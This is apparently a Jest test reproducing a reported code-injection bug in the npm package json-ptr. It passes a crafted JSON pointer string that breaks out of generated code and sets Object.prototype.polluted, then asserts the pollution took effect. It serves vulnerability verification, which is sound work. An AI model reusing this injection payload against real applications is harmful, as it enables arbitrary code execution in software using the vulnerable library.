//https://www.huntr.dev/bounties/2-npm-json-ptr/
test("Arbitrary code execution in json-ptr", () => {
  const fs = require("fs");
  const jptr = require("json-ptr");
  const path = "./json-ptr";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);

  JsonPointer = jptr.JsonPointer;

  try {
    JsonPointer.get(
      {},
      "/aaa'])) !== 'undefined') {return it;}; 1 + (Object.prototype.polluted = `yes`); if(((['a"
    );
  } catch (error) {}

  expect({}.polluted).toBe("yes");
});
